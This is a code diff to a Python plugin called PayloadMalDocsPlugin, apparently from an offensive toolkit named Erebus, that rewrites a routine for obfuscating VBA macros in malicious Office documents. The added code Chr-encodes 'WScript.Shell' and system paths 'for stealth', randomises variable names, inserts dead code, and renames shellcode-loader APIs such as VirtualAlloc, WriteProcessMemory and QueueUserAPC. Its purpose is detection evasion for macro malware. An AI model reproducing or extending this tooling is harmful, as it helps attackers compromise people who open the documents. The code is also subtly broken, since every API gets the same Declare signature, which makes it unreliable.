@@ -474,30 +474,107 @@ class PayloadMalDocsPlugin(ErebusPlugin):
             str: Obfuscated VBA code
         """
         import re
+        import random
         
         obfuscated = vba_code
         
-        # Rename common function names
-        replacements = {
-            'Shell': 'Sh' + chr(101) + 'll',
-            'CreateObject': 'Cr' + chr(101) + 'ateObject',
-            'WScript': 'WSc' + chr(114) + 'ipt',
+        # 1. Remove existing comments to clean slate
+        obfuscated = re.sub(r"'.*?$", "", obfuscated, flags=re.MULTILINE)
+        
+        # 2. Obfuscate sensitive strings using Chr() encoding
+        def encode_sensitive_string(text):
+            """Encode critical strings using Chr() for stealth"""
+            if len(text) <= 3:
+                return f'"{text}"'
+            # Use first char literal, rest encoded
+            return f'"{text[0]}" & ' + ' & '.join([f'Chr({ord(c)})' for c in text[1:]])
+        
+        # 3. Replace critical API calls with obfuscated versions
+        obfuscated = obfuscated.replace(
+            'CreateObject("WScript.Shell")',
+            'CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108))'
+        )
+        
+        # 4. Obfuscate .Run method call
+        obfuscated = obfuscated.replace('.Run cmd', '.Run (cmd)')
+        
+        # 5. Split executable paths
+        obfuscated = obfuscated.replace(
+            'C:\\Windows\\System32',
+            'Chr(67)&Chr(58)&Chr(92)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(115)&Chr(92)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(51)&Chr(50)'
+        )
+        
+        # 6. Variable name obfuscation - rename Dim variables to random names
+        variable_map = {}
+        var_pattern = r'\bDim\s+(\w+)\s+As\s+(\w+)'
+        
+        for match in re.finditer(var_pattern, obfuscated):
+            original_name = match.group(1)
+            if original_name not in variable_map and not original_name.startswith('_'):
+                obfuscated_name = f'v{random.randint(10000, 99999)}'
+                variable_map[original_name] = obfuscated_name
+        
+        # Apply variable name replacements
+        for original, obfuscated_name in variable_map.items():
+            obfuscated = re.sub(r'\b' + original + r'\b', obfuscated_name, obfuscated)
+        
+        # 7. String concatenation obfuscation - split long strings
+        def obfuscate_long_strings(match):
+            string = match.group(1)
+            if len(string) > 20:
+                parts = [string[i:i+8] for i in range(0, len(string), 8)]
+                return ' & '.join([f'"{part}"' for part in parts])
+            return match.group(0)
+        
+        obfuscated = re.sub(r'"([^"]{20,})"', obfuscate_long_strings, obfuscated)
+        
+        # 8. Add dead code branches
+        dead_code = [
+            '\nIf False Then\n    Dim _unused As String\n    _unused = "deadcode"\nEnd If\n',
+            '\nOn Error GoTo 0\n',
+            '\nIf 0 = 1 Then Exit Sub\n',
+        ]
+        
+        lines = obfuscated.split('\n')
+        for _ in range(min(2, len(lines) // 5)):
+            if len(lines) > 3:
+                insert_pos = random.randint(2, len(lines) - 1)
+                lines.insert(insert_pos, random.choice(dead_code))
+        
+        obfuscated = '\n'.join(lines)
+        
+        # 9. Add junk variable declarations
+        junk_vars = f'''
+Dim p{random.randint(1000,9999)} As Variant
+p{random.randint(1000,9999)} = Array(1,2,3,4,5)
+'''
+        obfuscated = junk_vars + obfuscated
+        
+        # 10. Use line continuation characters to obscure flow
+        obfuscated = obfuscated.replace('Set ', 'Set _\n')
+        obfuscated = obfuscated.replace('ThisWorkbook.Close', 'ThisWorkbook _\n.Close')
+        
+        # 11. Obfuscate native API calls by renaming them
+        # Map common shellcode loader APIs to obfuscated names
+        api_replacements = {
+            'VirtualAlloc': f'v{random.randint(10000, 99999)}Alloc',
+            'RtlMoveMemory': f'v{random.randint(10000, 99999)}Move',
+            'CreateThread': f'v{random.randint(10000, 99999)}Thread',
+            'VirtualAllocEx': f'v{random.randint(10000, 99999)}AllocEx',
+            'WriteProcessMemory': f'v{random.randint(10000, 99999)}Write',
+            'QueueUserAPC': f'v{random.randint(10000, 99999)}APC',
+            'EnumSystemLocalesA': f'v{random.randint(10000, 99999)}Locales',
         }
         
-        for original, replacement in replacements.items():
-            obfuscated = re.sub(rf'\b{original}\b', replacement, obfuscated, flags=re.IGNORECASE)
+        # Only obfuscate APIs that are actually used in the code
+        for api, obfuscated_name in api_replacements.items():
+            if api in obfuscated:
+                # Add Declare statement at the beginning
+                obfuscated = f'Declare PtrSafe Function {obfuscated_name} Lib "kernel32" Alias "{api}" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\n' + obfuscated
+                # Replace API call with obfuscated name
+                obfuscated = obfuscated.replace(api, obfuscated_name)
         
-        # Add comment obfuscation
-        lines = obfuscated.split('\n')
-        obfuscated_lines = []
-        for line in lines:
-            if not line.strip().startswith("'"):
-                # Add random comments
-                obfuscated_lines.append(line + " ' " + "x" * 20)
-            else:
-                obfuscated_lines.append(line)
-        
-        return '\n'.join(obfuscated_lines)
+        return obfuscated
 
     def generate_command_execution_vba(self, trigger_binary, trigger_command, trigger_type="AutoOpen"):
         """
